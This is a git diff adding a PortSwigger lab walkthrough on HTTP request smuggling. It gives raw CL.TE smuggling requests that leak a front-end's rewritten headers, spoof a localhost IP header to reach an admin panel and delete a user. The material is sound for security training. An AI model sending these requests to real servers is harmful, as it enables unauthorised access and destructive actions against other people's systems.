@@ -11,6 +11,7 @@
 - [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](#http-request-smuggling-confirming-a-tecl-vulnerability-via-differential-responses)
 - [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-clte-vulnerability)
 - [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls-tecl-vulnerability)
+- [Exploiting HTTP request smuggling to reveal front-end request rewriting](#exploiting-http-request-smuggling-to-reveal-front-end-request-rewriting)
 
 ## HTTP request smuggling, basic CL.TE vulnerability
 Reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
@@ -295,4 +296,66 @@ x=1
 0
 
 
+```
+
+## Exploiting HTTP request smuggling to reveal front-end request rewriting
+Reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
+
+<!-- omit in toc -->
+### Solution
+1. Browse to ``/admin`` and observe that the admin panel can only be loaded from ``127.0.0.1``.
+2. Use the site's search function and observe that it reflects the value of the ``search`` parameter.
+3. Use Burp Repeater to issue the following request twice.
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+```
+4. The second response should contain "Search results for" followed by the start of a rewritten HTTP request.
+5. Make a note of the name of the`` X-*-IP`` header in the rewritten request, and use it to access the admin panel:
+```
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
+6. Using the previous response as a reference, change the smuggled request URL to delete the user carlos:
+
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
 ```
